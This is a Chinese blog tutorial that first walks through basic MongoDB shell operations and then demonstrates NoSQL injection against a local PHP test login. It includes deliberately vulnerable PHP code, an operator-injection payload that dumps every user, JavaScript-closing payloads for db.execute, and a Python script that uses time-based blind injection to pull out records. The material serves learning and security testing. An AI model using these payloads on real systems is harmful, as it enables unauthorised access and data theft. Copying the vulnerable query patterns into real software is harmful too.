---
title: Mongodb基础操作及基础注入
url: 274.html
id: 274
categories:
  - sql注入
  - 学习笔记
date: 2018-04-08 12:42:09
tags:
---

### 前言

感觉最近的javascript前景大好，前后端通杀。nosql缓存机制的应用也越来越广泛，不说长远，至少是近期的一种趋势。 最近也就打算开始着手学习js，以及一些缓存应用，就先从mongodb开始。安装配置部分就省略了，网上教程实在太多。  

### 常用操作

**数据库**

*   创建/使用数据库   use DB_NAME (使用时不存在直接创建，无需手动创建)
*   查看所有数据库  show dbs
*   查看当前数据库   db
*   删除数据库          db.dropDatabase()   （需切换到对应数据库下）

**集合**（类似表）

*   创建集合   db.createCollection(name\[,options\])   （直接插入数据时也会自动生成对应集合，options用来指定一些大小、长度参数）
*   查看集合  show collections
*   删除集合  db.COLLECT_NAME.drop()

  **文档**（以**键值对**组成的数据，语法为js的对象） **插入文档**     db.COLLECTION_NAME.insert(document)

\> db.test.insert({"username":"kingkk","password":"password"})
WriteResult({ "nInserted" : 1 })

  **查询文档 **    db.find()        (不加参数显示所有数据)

\> db.test.find({"username":"root"})
{ "_id" : ObjectId("5ac5cab38651bb24144aecad"), "username" : "root", "password" : "123456" }

返回指定字段(假如第二个键值对集合，指定字段1/0，_id字段默认显示)

\> db.test.find({},{'_id':0,'username':1})
{ "username" : "root" }
{ "username" : "aaa" }
{ "username" : "bbb" }
{ "username" : "ccc" }

以及findOne()   **更新文档**    db.COLLECTION_NAME.update({<query>},{$set,<update>},{options}) query  更新文档的条件    update 更新后的数据 **options** :

*   multi     multi=true时更新多条符合条件的数据，默认只更新一条  
*   upsert    upsert=true 不存在符合条件按时插入，默认不插入

\> db.test.update({"name":"test"},{**$set**:{"password":"kingkk"}},{multi:true})
  WriteResult({ "nMatched" : 5, "nUpserted" : 0, "nModified" : 5 })

一些3.2之后的函数

*   updateOne()
*   updateMany()

**save**与update类似，_id相同时会更新，否则插入一条   **删除文档**   db.collection.remove( <query>, {<justOne>})   justone是否只删除一条，默认否

*   db.collection.deleteOne()
*   db.collection.delectMany()

  **查询文档**   db.collection.find(queryn)

*   find().pretty()格式化输出数据
*   Find().limit(num)返回指定条数
*   find().limit(num).skip(num)  类似于offset
*   find().sort({KEY:1})  以指定关键字排序输出

**一些比较运算符**

等于

{<key>:<value>}

db.col.find({"by":"value1"})

where by = 'value1'

小于

{<key>:{$lt:<value>}}

db.col.find({"likes":{$lt:50}})

where likes < 50

小于或等于

{<key>:{$lte:<value>}}

db.col.find({"likes":{$lte:50}})

where likes <= 50

大于

{<key>:{$gt:<value>}}

db.col.find({"likes":{$gt:50}})

where likes > 50

大于或等于

{<key>:{$gte:<value>}}

db.col.find({"likes":{$gte:50}})

where likes >= 50

不等于

{<key>:{$ne:<value>}}

db.col.find({"likes":{$ne:50}})

where likes != 50

**一些连接运算符**

*   and：{<key1>:<value1>，<key2>:<value2>}
*   or ： {$or:\[{<key1>:<value1>，<key2>:<value2>}\]}

**类型判断** {$type: num}    不同数字对应不同的数据类型

\> db.test.find({"args":{$type:2}})   type2对应的是string

{ "\_id" : ObjectId("5ac86f87d9386757e892207f"), "func" : "my\_func", "args" : \[ "aaa", "bbb", "ccc" \] }

 

### Mongodb注入

##### php

页面代码如下，模拟了一个简单的用户登录功能

    <?php 
    $mongo = new mongoclient(); 
    $db = $mongo->test; //选择数据库
    $coll = $db->user; //选择集合
    $username = $_GET['username'];
    $password = $_GET['password'];
    $con = array("username"=>$username,"password"=>$password);
    
    $data = $coll->find($con);
    
    foreach ($data as $d) {
        echo "username is :".$d['username']."
    ";
    }

输入正确的用户名密码，即可完成登录。输入错误时，无回显 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/7502670d2d9625d0d295317a8e29e392.png)![](http://blog.kingkk.com/wp-content/uploads/2018/04/1c84d57d1cdc38153d573b84e7a59f1b.png) 此时当我们传入如下参数时`username[$ne]=kingkk&password[$ne]=1` ![](http://blog.kingkk.com/wp-content/uploads/2018/04/db556e67f8811bd80a036ba34a4c2431.png) 就会输出全部的用户名和密码 输出一下此时的变量 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/1dd767ffbb9ce356464aa9bb665a3aa1.png) 可以看到，username和password都被转化成了两个数组，而传入mongodb的数组，也变成了一个嵌套数组

$con  =   array\[ 'username' => array \[ '$ne' => 'kingkk' \] , 'password' => array\[ '$ne' => '1' \] \]

等价于再mongodb运行如下语句

\> db.user.find({'username':{'$ne':'kingkk'},'password':{'$ne':'1'}})

这里用到了比较运算符$ne 不等于 语义为，寻找用户名不等于kingkk且密码不等于1的用户，自然而然的筛选出了全部用户  

* * *

当php不是用pdo的类查询模式，而是通过运行mongodb语句进行查询时 模拟环境代码如下

    
    <?php 
    $mongo = new mongoclient();
     $db = $mongo->test; //选择数据库
    
    $username = $_GET['username'];
    $password = $_GET['password'];
    
    $query = "var data = db.user.findOne({username:'$username',password:'$password'});return data;";
    echo $query."<br>";
    $data = $db->execute($query);
    
    if ($data['ok'] == 1) {
        if ($data['retval']!=NULL) {
            echo 'username:'.$data['retval']['username']."";
            echo 'password:'.$data['retval']['password']."";
        }else{
            echo 'cant find';
        }
    }else{
        echo $data['errmsg'];
    }

正常运行时 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/d597cc760b043d53a94e07a5d81fac24.png) 根据execute可以执行多条语句的特性，尝试闭合语句，输入如下payload （貌似//注释符高版本不能用了） （后来确认了下，当语句return时，后面的代码就不执行了，但依旧要保证语法的正确性）

?username=test',password:'kingkk'});return{username:1,password:2};({aaa:'9
&password=1

执行语句如下

var data = db.user.findOne({username:'test',password:'kingkk'});return{username:1,password:2};({aaa:'9',password:'1'});return data;

执行结果 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/a6dca26460378827f4324288048f3018.png) 再利用tojson函数，即可获得想要的数据  `tojson(db.test.find()[0])` ![](http://blog.kingkk.com/wp-content/uploads/2018/04/1bd1005de4babc8dbafcc8f6c1fd965c.png) 当无回显时，可用新增一条盲注语句的方式

?username=test',password:'kingkk'});if(db.version()>"3"){sleep(2000)};return{username:1,password:2};({aaa:'9
&password=1

成功产生延时 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/a723ff22973ffb15ae24b855c6c3c6a3.png) 然后开始获取数据 获取集合个数

db.getCollectionNames().length==2

获取集合名字长度

db.getCollectionNames()\[2\].length==4

获取集合名字

db.getCollectionNames()\[2\]\[0\]>'a'

由于find之后的结果是个集合，不是个字符串无法进行比较。所以要用tojson的方式，转换成字符串，从而获取每个字段的值

tojson(db.user.find()\[0\])\[0\]=='{'

附上一个自己的盲注入脚本（延时可根据自己的网络延时进行判定，因为我是本地服务器，节省时间就减小了延迟）

    #encoding=utf8
    
    import requests, re, threading,time,string
    
    char_range = [i for i in string.printable+chr(0)+chr(13)+chr(10)+chr(32)]
    
    url = "http://localhost/code/12.php"
    res = []
    lock = threading.Lock()
    
    for char_len in range(96):
    	for char in char_range:
    		my_str = "tojson(db.user.find()[0])[{}]=='{}'".format(char_len,char)
    		sql_str = "test',password:'kingkk'});if(%s){sleep(300)};return{username:1,password:2};({aaa:'9" % my_str
    		params = dict(username = sql_str,password=1)
    		start_time = time.time()
    		r = requests.get(url=url,params=params)
    		end_time = time.time()
    		if end_time-start_time>0.3:
    			res.append(char)
    			for i in res:
    				print(i,end="")
    			print("\n")
    			break
    
    

效果图 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/58246a741c39a91d93eeed28a08c260f.png)    

### 总结

  **pdo模式下**，能够执行的语句极少，只能进行一些回显判断 **执行语句的模式下**，后来发现其实并不需要完整的闭合语句，只要设置语法没有问题即可 如下payload也能产生延时

?username=test'});if(tojson(db.user.find())){sleep(1000)};return;({aaa:'9
&password=1

执行的语句如下（手工进行了换行）

var data = db.user.findOne({username:'test'});
if(tojson(db.user.find())){sleep(1000)};
return;                 之后的语句不执行，但要保证语法正确性
({a:'9',password:'1'});
return data;

只要顺利的闭合前后的 ({'  与 ‘}） 保证语法没有错误，即可 当然，要回显数据注入时，就要事先知道他的字段名